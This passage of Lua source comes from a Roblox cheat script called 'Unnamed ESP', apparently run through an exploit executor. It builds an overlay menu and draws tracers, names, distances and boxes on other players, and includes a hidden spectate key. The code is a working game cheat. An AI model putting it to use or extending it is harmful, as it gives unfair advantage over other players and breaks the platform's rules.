                self.Drawings['Circle-CursorOutlineSquare'] { Position = Pointer.Position };
            end
        end
    end

    function Picker:HandleInput(Input, P, Type)
        if Type == 'Began' then
            if Input.UserInputType.Name == 'MouseButton1' then
                local Main = self.Drawings['Image-Main'] ();
                local SquareSV = self.Drawings['Square-Preview'] ();
                local MousePosition = V2New(Input.Position.X, Input.Position.Y + 33);
                self.MouseHeld = true;
                local Bounds = Main.Size / 2;
                local Center = Main.Position + Bounds;
                local R = (MousePosition - Center);
        
                if R.Magnitude < Bounds.X and R.Magnitude > Bounds.X - 20 then
                    self.Item = 'Ring';
                end
                
                if MousePosition.X > SquareSV.Position.X and MousePosition.Y > SquareSV.Position.Y and MousePosition.X < SquareSV.Position.X + SquareSV.Size.X and MousePosition.Y < SquareSV.Position.Y + SquareSV.Size.Y then
                    self.Item = 'HL';
                end

                self:UpdatePosition(Input, P);
            end
        elseif Type == 'Changed' then
            if Input.UserInputType.Name == 'MouseMovement' then
                self:UpdatePosition(Input, P);
            end
        elseif Type == 'Ended' and Input.UserInputType.Name == 'MouseButton1' then
            self.Item = nil;
        end
	end
	
	function Picker:Dispose()
		self.Drawings(false);
		self.UpdatePosition = nil;
		self.HandleInput = nil;
		Connections:DisconnectAll(); -- scuffed tbh
	end

	Connections:Listen(UserInputService.InputBegan, function(Input, Process)
		Picker:HandleInput(Input, Process, 'Began');
	end);
	Connections:Listen(UserInputService.InputChanged, function(Input, Process)
		if Input.UserInputType.Name == 'MouseMovement' then
			local MousePosition = V2New(Input.Position.X, Input.Position.Y + 33);
			local Cursor = Picker.Drawings['Triangle-Cursor'] {
				Filled = true;
				Color = Color3.new(0.9, 0.9, 0.9);
				PointA = MousePosition + V2New(0, 0);
				PointB = MousePosition + V2New(12, 14);
				PointC = MousePosition + V2New(0, 18);
				Thickness = 0;
			};
		end
		Picker:HandleInput(Input, Process, 'Changed');
	end);
	Connections:Listen(UserInputService.InputEnded, function(Input, Process)
		Picker:HandleInput(Input, Process, 'Ended');
		
		if Input.UserInputType.Name == 'MouseButton1' then
			Picker.MouseHeld = false;
		end
	end);

	ColorPicker.Loading = false;

    Picker.Drawings = Drawings;
    return Picker;
end

function SubMenu:Show(Position, Title, Options)
	self.Open = true;

	local Visible = true;
	local BasePosition = Position;
	local BaseSize = V2New(200, 140);
	local End = BasePosition + BaseSize;

	self.Bounds = { BasePosition.X, BasePosition.Y, End.X, End.Y };

	delay(0.025, function()
		if not self.Open then return; end

		Menu:AddMenuInstance('Sub-Main', 'Square', {
			Size		= BaseSize;
			Position	= BasePosition;
			Filled		= false;
			Color		= Colors.Primary.Main;
			Thickness	= 3;
			Visible		= Visible;
		});
	end);
	Menu:AddMenuInstance('Sub-TopBar', 'Square', {
		Position	= BasePosition;
		Size		= V2New(BaseSize.X, 10);
		Color		= Colors.Primary.Dark;
		Filled		= true;
		Visible		= Visible;
	});
	Menu:AddMenuInstance('Sub-TopBarTwo', 'Square', {
		Position 	= BasePosition + V2New(0, 10);
		Size		= V2New(BaseSize.X, 20);
		Color		= Colors.Primary.Main;
		Filled		= true;
		Visible		= Visible;
	});
	Menu:AddMenuInstance('Sub-TopBarText', 'Text', {
		Size 		= 20;
		Position	= shared.MenuDrawingData.Instances['Sub-TopBarTwo'].Position + V2New(15, -3);
		Text		= Title or '';
		Color		= Colors.Secondary.Light;
		Visible		= Visible;
	});
	Menu:AddMenuInstance('Sub-Filling', 'Square', {
		Size		= BaseSize - V2New(0, 30);
		Position	= BasePosition + V2New(0, 30);
		Filled		= true;
		Color		= Colors.Secondary.Main;
		Transparency= .75;
		Visible		= Visible;
	});

	if Options then
		for Index, Option in pairs(Options) do -- currently only supports color and button(but color is a button so), planning on fully rewriting or something
			local function GetName(Name) return ('Sub-%s.%d'):format(Name, Index) end
			local Position = shared.MenuDrawingData.Instances['Sub-Filling'].Position + V2New(20, Index * 25 - 10);
			-- local BasePosition	= shared.MenuDrawingData.Instances.Filling.Position + V2New(30, v.Index * 25 - 10);

			if Option.Type == 'Color' then
				local ColorPreview = Menu:AddMenuInstance(GetName'ColorPreview', 'Circle', {
					Position = Position;
					Color = Option.Color;
					Radius = IsSynapse and 10 or 10;
					NumSides = 10;
					Filled = true;
					Visible = true;
				});
				local Text = Menu:AddMenuInstance(GetName'Text', 'Text', {
					Text = Option.Text;
					Position = ColorPreview.Position + V2New(15, -8);
					Size = 16;
					Color = Colors.Primary.Dark;
					Visible = true;
				});
				UIButtons[#UIButtons + 1] = {
					FromSubMenu = true;
					Option = function() return Option.Function(ColorPreview, BasePosition + V2New(BaseSize.X, 0)) end;
					Instance = Menu:AddMenuInstance(Format('%s_Hitbox', GetName'Button'), 'Square', {
						Position	= Position - V2New(20, 12);
						Size		= V2New(BaseSize.X, 25);
						Visible		= false;
					});
				};
			elseif Option.Type == 'Button' then
				UIButtons[#UIButtons + 1] = {
					FromSubMenu = true;
					Option = Option.Function;
					Instance = Menu:AddMenuInstance(Format('%s_Hitbox', GetName'Button'), 'Square', {
						Size		= V2New(BaseSize.X, 20) - V2New(20, 0);
						Visible		= true;
						Transparency= .5;
						Position	= Position - V2New(10, 10);
						Color		= Colors.Secondary.Light;
						Filled		= true;
					});
				};
				local Text		= Menu:AddMenuInstance(Format('%s_Text', GetName'Text'), 'Text', {
					Text		= Option.Text;
					Size		= 18;
					Position	= Position + V2New(5, -10);
					Visible		= true;
					Color		= Colors.Primary.Dark;
				});
			end
		end
	end
end

function SubMenu:Hide()
	self.Open = false;

	for i, v in pairs(shared.MenuDrawingData.Instances) do
		if i:sub(1, 3) == 'Sub' then
			v.Visible = false;

			if i:sub(4, 4) == ':' then -- ';' = Temporary so remove
				v:Remove();
				shared.MenuDrawingData.Instance[i] = nil;
			end
		end
	end

	for i, Button in pairs(UIButtons) do
		if Button.FromSubMenu then
			UIButtons[i] = nil;
		end
	end

	spawn(function() -- stupid bug happens if i dont use this
		for i = 1, 10 do
			if shared.CurrentColorPicker then -- dont know why 'CurrentColorPicker' isnt a variable in this
				shared.CurrentColorPicker:Dispose();
			end
			wait(0.1);
		end
	end)

	CurrentColorPicker = nil;
end

function CreateMenu(NewPosition) -- Create Menu
	MenuLoaded = false;
	UIButtons  = {};
	Sliders	   = {};

	local BaseSize = V2New(300, 625);
	local BasePosition = NewPosition or V2New(Camera.ViewportSize.X / 8 - (BaseSize.X / 2), Camera.ViewportSize.Y / 2 - (BaseSize.Y / 2));

	BasePosition = V2New(math.clamp(BasePosition.X, 0, Camera.ViewportSize.X), math.clamp(BasePosition.Y, 0, Camera.ViewportSize.Y));

	Menu:AddMenuInstance('CrosshairX', 'Line', {
		Visible			= false;
		Color			= Color3.new(0, 1, 0);
		Transparency	= 1;
		Thickness		= 1;
	});
	Menu:AddMenuInstance('CrosshairY', 'Line', {
		Visible			= false;
		Color			= Color3.new(0, 1, 0);
		Transparency	= 1;
		Thickness		= 1;
	});

	delay(.025, function() -- since zindex doesnt exist
		Menu:AddMenuInstance('Main', 'Square', {
			Size		= BaseSize;
			Position	= BasePosition;
			Filled		= false;
			Color		= Colors.Primary.Main;
			Thickness	= 3;
			Visible		= true;
		});
	end);
	Menu:AddMenuInstance('TopBar', 'Square', {
		Position	= BasePosition;
		Size		= V2New(BaseSize.X, 15);
		Color		= Colors.Primary.Dark;
		Filled		= true;
		Visible		= true;
	});
	Menu:AddMenuInstance('TopBarTwo', 'Square', {
		Position 	= BasePosition + V2New(0, 15);
		Size		= V2New(BaseSize.X, 45);
		Color		= Colors.Primary.Main;
		Filled		= true;
		Visible		= true;
	});
	Menu:AddMenuInstance('TopBarText', 'Text', {
		Size 		= 25;
		Position	= shared.MenuDrawingData.Instances.TopBarTwo.Position + V2New(25, 10);
		Text		= 'Unnamed ESP';
		Color		= Colors.Secondary.Light;
		Visible		= true;
		Transparency= 1; -- proto outline fix
		Outline 	= true;
		OutlineOpacity = 0.5;
	});
	Menu:AddMenuInstance('TopBarTextBR', 'Text', {
		Size 		= 18;
		Position	= shared.MenuDrawingData.Instances.TopBarTwo.Position + V2New(BaseSize.X - 75, 25);
		Text		= 'by ic3w0lf';
		Color		= Colors.Secondary.Light;
		Visible		= true;
		Transparency= 1;
		Outline 	= true;
		OutlineOpacity = 0.5;
	});
	Menu:AddMenuInstance('Filling', 'Square', {
		Size		= BaseSize - V2New(0, 60);
		Position	= BasePosition + V2New(0, 60);
		Filled		= true;
		Color		= Colors.Secondary.Main;
		Transparency= .5;
		Visible		= true;
	});

	local CPos = 0;

	GetTableData(Options)(function(i, v)
		if typeof(v.Value) == 'boolean' and not IsStringEmpty(v.Text) and v.Text ~= nil then
			CPos 				= CPos + 25;
			local BaseSize		= V2New(BaseSize.X, 30);
			local BasePosition	= shared.MenuDrawingData.Instances.Filling.Position + V2New(30, v.Index * 25 - 10);
			UIButtons[#UIButtons + 1] = {
				Option = v;
				Instance = Menu:AddMenuInstance(Format('%s_Hitbox', v.Name), 'Square', {
					Position	= BasePosition - V2New(30, 15);
					Size		= BaseSize;
					Visible		= false;
				});
			};
			Menu:AddMenuInstance(Format('%s_OuterCircle', v.Name), 'Circle', {
				Radius		= 10;
				Position	= BasePosition;
				Color		= Colors.Secondary.Light;
				Filled		= true;
				Visible		= true;
			});
			Menu:AddMenuInstance(Format('%s_InnerCircle', v.Name), 'Circle', {
				Radius		= 7;
				Position	= BasePosition;
				Color		= Colors.Secondary.Dark;
				Filled		= true;
				Visible		= v.Value;
			});
			Menu:AddMenuInstance(Format('%s_Text', v.Name), 'Text', {
				Text		= v.Text;
				Size		= 20;
				Position	= BasePosition + V2New(20, -10);
				Visible		= true;
				Color		= Colors.Secondary.Light;
				Transparency= 1;
				Outline		= true;
				OutlineOpacity = 0.5;
			});
		end
	end)
	GetTableData(Options)(function(i, v) -- just to make sure certain things are drawn before or after others, too lazy to actually sort table
		if typeof(v.Value) == 'number' then
			CPos 				= CPos + 25;

			local BaseSize		= V2New(BaseSize.X, 30);
			local BasePosition	= shared.MenuDrawingData.Instances.Filling.Position + V2New(0, CPos - 10);

			local Line			= Menu:AddMenuInstance(Format('%s_SliderLine', v.Name), 'Square', {
				Transparency	= 1;
				Color			= Colors.Secondary.Light;
				-- Thickness		= 3;
				Filled			= true;
				Visible			= true;
				Position 		= BasePosition + V2New(15, -5);
				Size 			= BaseSize - V2New(30, 10);
				Transparency	= 0.5;
			});
			local Slider		= Menu:AddMenuInstance(Format('%s_Slider', v.Name), 'Square', {
				Visible			= true;
				Filled			= true;
				Color			= Colors.Primary.Dark;
				Size			= V2New(5, Line.Size.Y);
				Transparency	= 0.5;
			});
			local Text			= Menu:AddMenuInstance(Format('%s_Text', v.Name), 'Text', {
				Text			= v.Text;
				Size			= 20;
				Center			= true;
				Transparency	= 1;
				Outline			= true;
				OutlineOpacity  = 0.5;
				Visible			= true;
				Color			= Colors.White;
			}); Text.Position	= Line.Position + (Line.Size / 2) - V2New(0, Text.TextBounds.Y / 1.75);
			local AMT			= Menu:AddMenuInstance(Format('%s_AmountText', v.Name), 'Text', {
				Text			= tostring(v.Value);
				Size			= 22;
				Center			= true;
				Transparency	= 1;
				Outline			= true;
				OutlineOpacity  = 0.5;
				Visible			= true;
				Color			= Colors.White;
				Position		= Text.Position;
			});

			local CSlider = {Slider = Slider; Line = Line; Min = v.AllArgs[4]; Max = v.AllArgs[5]; Option = v};
			local Dummy = Instance.new'NumberValue';

			Dummy:GetPropertyChangedSignal'Value':Connect(function()
				Text.Transparency = Dummy.Value;
				-- Text.OutlineTransparency = 1 - Dummy.Value;
				AMT.Transparency = 1 - Dummy.Value;
			end);

			Dummy.Value = 1;

			function CSlider:ShowValue(Bool)
				self.ShowingValue = Bool;

				TweenService:Create(Dummy, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Value = Bool and 0 or 1 }):Play();
			end

			Sliders[#Sliders + 1] = CSlider;

			-- local Percent = (v.Value / CSlider.Max) * 100;
			-- local Size = math.abs(Line.From.X - Line.To.X);
			-- local Value = Size * (Percent / 100); -- this shit's inaccurate but fuck it i'm not even gonna bother fixing it

			Slider.Position = Line.Position + V2New(35, 0);
			
			v.BaseSize = BaseSize;
			v.BasePosition = BasePosition;
			-- AMT.Position = BasePosition + V2New(BaseSize.X - AMT.TextBounds.X - 10, -10)
		end
	end)
	local FirstItem = false;
	GetTableData(Options)(function(i, v) -- just to make sure certain things are drawn before or after others, too lazy to actually sort table
		if typeof(v.Value) == 'EnumItem' then
			CPos 				= CPos + (not FirstItem and 30 or 25);
			FirstItem			= true;

			local BaseSize		= V2New(BaseSize.X, FirstItem and 30 or 25);
			local BasePosition	= shared.MenuDrawingData.Instances.Filling.Position + V2New(0, CPos - 10);

			UIButtons[#UIButtons + 1] = {
				Option = v;
				Instance = Menu:AddMenuInstance(Format('%s_Hitbox', v.Name), 'Square', {
					Size		= V2New(BaseSize.X, 20) - V2New(30, 0);
					Visible		= true;
					Transparency= .5;
					Position	= BasePosition + V2New(15, -10);
					Color		= Colors.Secondary.Light;
					Filled		= true;
				});
			};
			local Text		= Menu:AddMenuInstance(Format('%s_Text', v.Name), 'Text', {
				Text		= v.Text;
				Size		= 20;
				Position	= BasePosition + V2New(20, -10);
				Visible		= true;
				Color		= Colors.Secondary.Light;
				Transparency= 1;
				Outline		= true;
				OutlineOpacity = 0.5;
			});
			local BindText	= Menu:AddMenuInstance(Format('%s_BindText', v.Name), 'Text', {
				Text		= tostring(v.Value):match'%w+%.%w+%.(.+)';
				Size		= 20;
				Position	= BasePosition;
				Visible		= true;
				Color		= Colors.Secondary.Light;
				Transparency= 1;
				Outline		= true;
				OutlineOpacity = 0.5;
			});

			Options[i].BaseSize = BaseSize;
			Options[i].BasePosition = BasePosition;
			BindText.Position = BasePosition + V2New(BaseSize.X - BindText.TextBounds.X - 20, -10);
		end
	end)
	GetTableData(Options)(function(i, v) -- just to make sure certain things are drawn before or after others, too lazy to actually sort table
		if typeof(v.Value) == 'function' then
			local BaseSize		= V2New(BaseSize.X, 30);
			local BasePosition	= shared.MenuDrawingData.Instances.Filling.Position + V2New(0, CPos + (25 * v.AllArgs[4]) - 35);

			UIButtons[#UIButtons + 1] = {
				Option = v;
				Instance = Menu:AddMenuInstance(Format('%s_Hitbox', v.Name), 'Square', {
					Size		= V2New(BaseSize.X, 20) - V2New(30, 0);
					Visible		= true;
					Transparency= .5;
					Position	= BasePosition + V2New(15, -10);
					Color		= Colors.Secondary.Light;
					Filled		= true;
				});
			};
			local Text		= Menu:AddMenuInstance(Format('%s_Text', v.Name), 'Text', {
				Text		= v.Text;
				Size		= 20;
				Position	= BasePosition + V2New(20, -10);
				Visible		= true;
				Color		= Colors.Secondary.Light;
				Transparency= 1;
				Outline		= true;
				OutlineOpacity = 0.5;
			});

			-- BindText.Position = BasePosition + V2New(BaseSize.X - BindText.TextBounds.X - 10, -10);
		end
	end)

	delay(.1, function()
		MenuLoaded = true;
	end);

	-- this has to be at the bottom cuz proto drawing api doesnt have zindex :triumph:	
	Menu:AddMenuInstance('Cursor1', 'Line', {
		Visible			= false;
		Color			= Color3.new(1, 0, 0);
		Transparency	= 1;
		Thickness		= 2;
	});
	Menu:AddMenuInstance('Cursor2', 'Line', {
		Visible			= false;
		Color			= Color3.new(1, 0, 0);
		Transparency	= 1;
		Thickness		= 2;
	});
	Menu:AddMenuInstance('Cursor3', 'Line', {
		Visible			= false;
		Color			= Color3.new(1, 0, 0);
		Transparency	= 1;
		Thickness		= 2;
	});
end

CreateMenu();
delay(0.1, function()
	SubMenu:Show(V2New()); -- Create the submenu
	SubMenu:Hide();
end);

shared.UESP_InputChangedCon = UserInputService.InputChanged:Connect(function(input)
	if input.UserInputType.Name == 'MouseMovement' and Options.MenuOpen.Value then
		for i, v in pairs(Sliders) do
			local Values = {
				v.Line.Position.X;
				v.Line.Position.Y;
				v.Line.Position.X + v.Line.Size.X;
				v.Line.Position.Y + v.Line.Size.Y;
			};
			if MouseHoveringOver(Values) then
				v:ShowValue(true);
			else
				if not MouseHeld then v:ShowValue(false); end
			end
		end
	end
end)
shared.UESP_InputBeganCon = UserInputService.InputBegan:Connect(function(input)
	if input.UserInputType.Name == 'MouseButton1' and Options.MenuOpen.Value then
		MouseHeld = true;
		local Bar = Menu:GetInstance'TopBar';
		local Values = {
			Bar.Position.X;
			Bar.Position.Y;
			Bar.Position.X + Bar.Size.X;
			Bar.Position.Y + Bar.Size.Y;
		}
		if MouseHoveringOver(Values) then
			DraggingUI = true;
			DragOffset = Menu:GetInstance'Main'.Position - GetMouseLocation();
		else
			for i, v in pairs(Sliders) do
				local Values = {
					v.Line.Position.X;
					v.Line.Position.Y;
					v.Line.Position.X + v.Line.Size.X;
					v.Line.Position.Y + v.Line.Size.Y;
					-- v.Line.From.X	- (v.Slider.Radius);
					-- v.Line.From.Y	- (v.Slider.Radius);
					-- v.Line.To.X		+ (v.Slider.Radius);
					-- v.Line.To.Y		+ (v.Slider.Radius);
				};
				if MouseHoveringOver(Values) then
					DraggingWhat = v;
					Dragging = true;
					break
				end
			end

			if not Dragging then
				local Values = {
					TracerPosition.X - 10;
					TracerPosition.Y - 10;
					TracerPosition.X + 10;
					TracerPosition.Y + 10;
				};
				if MouseHoveringOver(Values) then
					DragTracerPosition = true;
				end
			end
		end
	end
end)
shared.UESP_InputEndedCon = UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType.Name == 'MouseButton1' and Options.MenuOpen.Value then
		MouseHeld = false;
		DragTracerPosition = false;
		local IgnoreOtherInput = false;

		if SubMenu.Open and not MouseHoveringOver(SubMenu.Bounds) then
			if CurrentColorPicker and IsMouseOverDrawing(CurrentColorPicker.Drawings['Square-Background']()) then IgnoreOtherInput = true; end
			if not IgnoreOtherInput then SubMenu:Hide() end
		end

		if not IgnoreOtherInput then
			for i, v in pairs(UIButtons) do
				if SubMenu.Open and MouseHoveringOver(SubMenu.Bounds) and not v.FromSubMenu then continue end

				local Values = {
					v.Instance.Position.X;
					v.Instance.Position.Y;
					v.Instance.Position.X + v.Instance.Size.X;
					v.Instance.Position.Y + v.Instance.Size.Y;
				};
				if MouseHoveringOver(Values) then
					v.Option();
					IgnoreOtherInput = true;
					break -- prevent clicking 2 options
				end
			end
			for i, v in pairs(Sliders) do
				if IgnoreOtherInput then break end

				local Values = {
					v.Line.Position.X;
					v.Line.Position.Y;
					v.Line.Position.X + v.Line.Size.X;
					v.Line.Position.Y + v.Line.Size.Y;
				};
				if not MouseHoveringOver(Values) then
					v:ShowValue(false);
				end
			end
		end
	elseif input.UserInputType.Name == 'MouseButton2' and Options.MenuOpen.Value and not DragTracerPosition then
		local Values = {
			TracerPosition.X - 10;
			TracerPosition.Y - 10;
			TracerPosition.X + 10;
			TracerPosition.Y + 10;
		}
		if MouseHoveringOver(Values) then
			DragTracerPosition = false;
			TracerPosition = V2New(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y - 135);
		end
	elseif input.UserInputType.Name == 'Keyboard' then
		if Binding then
			BindedKey = input.KeyCode;
			Binding = false;
		elseif input.KeyCode == Options.MenuKey.Value or (input.KeyCode == Enum.KeyCode.Home and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl)) then
			Options.MenuOpen();
		elseif input.KeyCode == Options.ToggleKey.Value then
			Options.Enabled();
		elseif input.KeyCode.Name == 'F1' and UserInputService:IsMouseButtonPressed(1) and shared.am_ic3 then -- hehe hiden spectate feature cuz why not
			local HD, LPlayer, LCharacter = 0.95;

			for i, Player in pairs(Players:GetPlayers()) do
				local Character = GetCharacter(Player);

				if Player ~= LocalPlayer and Player ~= Spectating and Character and Character:FindFirstChild'HumanoidRootPart' then
					local Head = Character:FindFirstChild'Head';
					local Humanoid = Character:FindFirstChildOfClass'Humanoid';
					
					if Head then
						local Distance  = (Camera.CFrame.Position - Head.Position).Magnitude;
						
						if Distance > Options.MaxDistance.Value then continue; end

						local Direction = -(Camera.CFrame.Position - Mouse.Hit.Position).unit;
						local Relative  = Character.Head.Position - Camera.CFrame.Position;
						local Unit      = Relative.unit;

						local DP = Direction:Dot(Unit);

						if DP > HD then
							HD = DP;
							LPlayer = Player;
							LCharacter = Character;
						end
					end
				end
			end
			
			if LPlayer and LPlayer ~= Spectating and LCharacter then
				Camera.CameraSubject = LCharacter.Head;
				Spectating = LPlayer;
			else
				if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass'Humanoid' then
					Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass'Humanoid';
					Spectating = nil;
				end
			end
		end
	end
end)

local function CameraCon() -- unnamed esp v1 sucks
	workspace.CurrentCamera:GetPropertyChangedSignal'ViewportSize':Connect(function()
		TracerPosition = V2New(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y - 135);
	end);
end

CameraCon();

local function ToggleMenu()
	if Options.MenuOpen.Value then
		-- GUIService:SetMenuIsOpen(true);
		GetTableData(shared.MenuDrawingData.Instances)(function(i, v)
			if OldData[v] then
				pcall(Set, v, 'Visible', true);
			end
		end)
	else
		-- GUIService:SetMenuIsOpen(false);
		GetTableData(shared.MenuDrawingData.Instances)(function(i, v)
			OldData[v] = v.Visible;
			if v.Visible then
				pcall(Set, v, 'Visible', false);
			end
		end)
	end
end

local function CheckRay(Instance, Distance, Position, Unit)
	local Pass = true;
	local Model = Instance;

	if Distance > 999 then return false; end

	if Instance.ClassName == 'Player' then
		Model = GetCharacter(Instance);
	end

	if not Model then
		Model = Instance.Parent;

		if Model.Parent == workspace then
			Model = Instance;
		end
	end

	if not Model then return false end

	local _Ray = Ray.new(Position, Unit * Distance);
	
	local List = {LocalPlayer.Character, Camera, Mouse.TargetFilter};

	for i,v in pairs(IgnoreList) do table.insert(List, v); end;

	local Hit = workspace:FindPartOnRayWithIgnoreList(_Ray, List);

	if Hit and not Hit:IsDescendantOf(Model) then
		Pass = false;
		if Hit.Transparency >= .3 or not Hit.CanCollide and Hit.ClassName ~= Terrain then -- Detect invisible walls
			IgnoreList[#IgnoreList + 1] = Hit;
		end
	end

	return Pass;
end

local function CheckTeam(Player)
	if Player.Neutral and LocalPlayer.Neutral then return true; end
	return Player.TeamColor == LocalPlayer.TeamColor;
end

local CustomTeam = CustomTeams[game.PlaceId];

if CustomTeam ~= nil then
	if CustomTeam.Initialize then ypcall(CustomTeam.Initialize) end

	CheckTeam = CustomTeam.CheckTeam;
end

local function CheckPlayer(Player, Character)
	if not Options.Enabled.Value then return false end

	local Pass = true;
	local Distance = 0;

	if Player ~= LocalPlayer and Character then
		if not Options.ShowTeam.Value and CheckTeam(Player) then
			Pass = false;
		end

		local Head = Character:FindFirstChild'Head';

		if Pass and Character and Head then
			Distance = (Camera.CFrame.Position - Head.Position).Magnitude;
			if Options.VisCheck.Value then
				Pass = CheckRay(Player, Distance, Camera.CFrame.Position, (Head.Position - Camera.CFrame.Position).unit);
			end
			if Distance > Options.MaxDistance.Value then
				Pass = false;
			end
		end
	else
		Pass = false;
	end

	return Pass, Distance;
end

local function CheckDistance(Instance)
	if not Options.Enabled.Value then return false end

	local Pass = true;
	local Distance = 0;

	if Instance ~= nil then
		Distance = (Camera.CFrame.Position - Instance.Position).Magnitude;
		if Options.VisCheck.Value then
			Pass = CheckRay(Instance, Distance, Camera.CFrame.Position, (Instance.Position - Camera.CFrame.Position).unit);
		end
		if Distance > Options.MaxDistance.Value then
			Pass = false;
		end
	else
		Pass = false;
	end

	return Pass, Distance;
end

local function UpdatePlayerData()
	if (tick() - LastRefresh) > (Options.RefreshRate.Value / 1000) then
		LastRefresh = tick();
		if CustomESP and Options.Enabled.Value then
			local a, b = pcall(CustomESP);
		end
		for i, v in pairs(RenderList.Instances) do
			if v.Instance ~= nil and v.Instance.Parent ~= nil and v.Instance:IsA'BasePart' then
				local Data = shared.InstanceData[v.Instance:GetDebugId()] or { Instances = {}; DontDelete = true };

				Data.Instance = v.Instance;

				Data.Instances['OutlineTracer'] = Data.Instances['OutlineTracer'] or NewDrawing'Line'{
					Transparency	= 0.75;
					Thickness		= 5;
					Color 			= Color3.new(0.1, 0.1, 0.1);
				}
				Data.Instances['Tracer'] = Data.Instances['Tracer'] or NewDrawing'Line'{
					Transparency	= 1;
					Thickness		= 2;
				}
				Data.Instances['NameTag'] = Data.Instances['NameTag'] or NewDrawing'Text'{
					Size			= Options.TextSize.Value;
					Center			= true;
					Outline			= Options.TextOutline.Value;
					Visible			= true;
				};
				Data.Instances['DistanceTag'] = Data.Instances['DistanceTag'] or NewDrawing'Text'{
					Size			= Options.TextSize.Value - 1;
					Center			= true;
					Outline			= Options.TextOutline.Value;
					Visible			= true;
				};

				local NameTag		= Data.Instances['NameTag'];
				local DistanceTag	= Data.Instances['DistanceTag'];
				local Tracer		= Data.Instances['Tracer'];
				local OutlineTracer	= Data.Instances['OutlineTracer'];

				local Pass, Distance = CheckDistance(v.Instance);

				if Pass then
					local ScreenPosition, Vis = WorldToViewport(v.Instance.Position);
					local Color = v.Color;
					local OPos = Camera.CFrame:pointToObjectSpace(v.Instance.Position);
					
					if ScreenPosition.Z < 0 then
						local AT = math.atan2(OPos.Y, OPos.X) + math.pi;
						OPos = CFrame.Angles(0, 0, AT):vectorToWorldSpace((CFrame.Angles(0, math.rad(89.9), 0):vectorToWorldSpace(V3New(0, 0, -1))));
					end
					
					local Position = WorldToViewport(Camera.CFrame:pointToWorldSpace(OPos));

					if Options.ShowTracers.Value then
						Tracer.Transparency = math.clamp(Distance / 200, 0.45, 0.8);
						Tracer.Visible	= true;
						Tracer.From		= TracerPosition;
						Tracer.To		= V2New(Position.X, Position.Y);
						Tracer.Color	= Color;
						OutlineTracer.Visible = true;
						OutlineTracer.Transparency = Tracer.Transparency - 0.1;
						OutlineTracer.From = Tracer.From;
						OutlineTracer.To = Tracer.To;
						OutlineTracer.Color	= Color3.new(0.1, 0.1, 0.1);
					else
						Tracer.Visible = false;
						OutlineTracer.Visible = false;
					end

					if ScreenPosition.Z > 0 then
						local ScreenPositionUpper = ScreenPosition;
						
						if Options.ShowName.Value then
							LocalPlayer.NameDisplayDistance = 0;
							NameTag.Visible		= true;
							NameTag.Text		= v.Text;
							NameTag.Size		= Options.TextSize.Value;
							NameTag.Outline		= Options.TextOutline.Value;
							NameTag.Position	= V2New(ScreenPositionUpper.X, ScreenPositionUpper.Y);
							NameTag.Color		= Color;
							if Drawing.Fonts and shared.am_ic3 then -- CURRENTLY SYNAPSE ONLY :MEGAHOLY:
								NameTag.Font	= Drawing.Fonts.Monospace;
							end
						else
							LocalPlayer.NameDisplayDistance = 100;
							NameTag.Visible = false;
						end
						if Options.ShowDistance.Value or Options.ShowHealth.Value then
							DistanceTag.Visible		= true;
							DistanceTag.Size		= Options.TextSize.Value - 1;
							DistanceTag.Outline		= Options.TextOutline.Value;
							DistanceTag.Color		= Color3.new(1, 1, 1);
							if Drawing.Fonts and shared.am_ic3 then -- CURRENTLY SYNAPSE ONLY :MEGAHOLY:
								NameTag.Font	= Drawing.Fonts.Monospace;
							end

							local Str = '';

							if Options.ShowDistance.Value then
								Str = Str .. Format('[%d] ', Distance);
							end

							DistanceTag.Text = Str;
							DistanceTag.Position = V2New(ScreenPositionUpper.X, ScreenPositionUpper.Y) + V2New(0, NameTag.TextBounds.Y);
						else
							DistanceTag.Visible = false;
						end
					else
						NameTag.Visible			= false;
						DistanceTag.Visible		= false;
					end
				else
					NameTag.Visible			= false;
					DistanceTag.Visible		= false;
					Tracer.Visible			= false;
					OutlineTracer.Visible	= false;
				end

				Data.Instances['NameTag'] 		= NameTag;
				Data.Instances['DistanceTag']	= DistanceTag;
				Data.Instances['Tracer']		= Tracer;
				Data.Instances['OutlineTracer']	= OutlineTracer;

				shared.InstanceData[v.Instance:GetDebugId()] = Data;
			end
		end
		for i, v in pairs(Players:GetPlayers()) do
			local Data = shared.InstanceData[v.Name] or { Instances = {}; };

			Data.Instances['Box'] = Data.Instances['Box'] or LineBox:Create{Thickness = 4};
			Data.Instances['OutlineTracer'] = Data.Instances['OutlineTracer'] or NewDrawing'Line'{
				Transparency	= 1;
				Thickness		= 3;
				Color			= Color3.new(0.1, 0.1, 0.1);
			}
			Data.Instances['Tracer'] = Data.Instances['Tracer'] or NewDrawing'Line'{
				Transparency	= 1;
				Thickness		= 1;
			}
			Data.Instances['HeadDot'] = Data.Instances['HeadDot'] or NewDrawing'Circle'{
				Filled			= true;
				NumSides		= 30;
			}
			Data.Instances['NameTag'] = Data.Instances['NameTag'] or NewDrawing'Text'{
				Size			= Options.TextSize.Value;
				Center			= true;
				Outline			= Options.TextOutline.Value;
				OutlineOpacity	= 1;
				Visible			= true;
			};
			Data.Instances['DistanceHealthTag'] = Data.Instances['DistanceHealthTag'] or NewDrawing'Text'{
				Size			= Options.TextSize.Value - 1;
				Center			= true;
				Outline			= Options.TextOutline.Value;
				OutlineOpacity	= 1;
				Visible			= true;
			};

			local NameTag		= Data.Instances['NameTag'];
			local DistanceTag	= Data.Instances['DistanceHealthTag'];
			local Tracer		= Data.Instances['Tracer'];
			local OutlineTracer	= Data.Instances['OutlineTracer'];
			local HeadDot		= Data.Instances['HeadDot'];
			local Box			= Data.Instances['Box'];

			local Character = GetCharacter(v);
			local Pass, Distance = CheckPlayer(v, Character);

			if Pass and Character then
				local Humanoid = Character:FindFirstChildOfClass'Humanoid';
				local Head = Character:FindFirstChild'Head';
				local HumanoidRootPart = Character:FindFirstChild(CustomRootPartName or 'HumanoidRootPart')

				local Dead = (Humanoid and Humanoid:GetState().Name == 'Dead')
				if type(GetAliveState) == 'function' then
					Dead = (not GetAliveState(v, Character))
				end

				if Character ~= nil and Head and HumanoidRootPart and not Dead then
					local ScreenPosition, Vis = WorldToViewport(Head.Position);
